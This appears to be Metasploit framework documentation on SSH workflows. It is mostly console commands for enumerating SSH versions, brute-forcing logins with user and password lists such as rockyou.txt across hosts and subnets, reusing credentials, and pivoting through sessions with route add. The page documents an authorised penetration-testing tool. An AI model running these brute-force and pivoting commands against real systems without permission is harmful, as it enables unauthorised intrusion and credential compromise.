## SSH Workflows

### SSH Enumeration

Enumerate SSH version:

```
use auxiliary/scanner/ssh/ssh_version
run ssh://127.0.0.1
```

### SSH Bruteforce

Brute-force host with known user and password list:

```
use scanner/ssh/ssh_login
run ssh://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt
```

Brute-force credentials:

```
use scanner/ssh/ssh_login
run ssh://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt
```

Brute-force credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
run cidr:/24:ssh://user@192.168.222.0 threads=50 pass_file=./rockyou.txt
```

### SSH Login

If you have valid SSH credentials the `ssh_login` module will open a Metasploit session for you:

```
use scanner/ssh/ssh_login
run ssh://user:pass@172.18.102.20
```

Re-using SSH credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use scanner/ssh/ssh_login
run ssh://user:pass@192.168.123.6:2222
```

### SSH Pivoting

Like Meterpreter, it is possible to [port forward through a Metasploit SSH session](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login.md#session-capabilities):

```
route add 172.18.103.0/24 ssh_session_id
```

To a route for the most recently opened Meterpreter session:

```
route add 172.18.103.0/24 -1
```
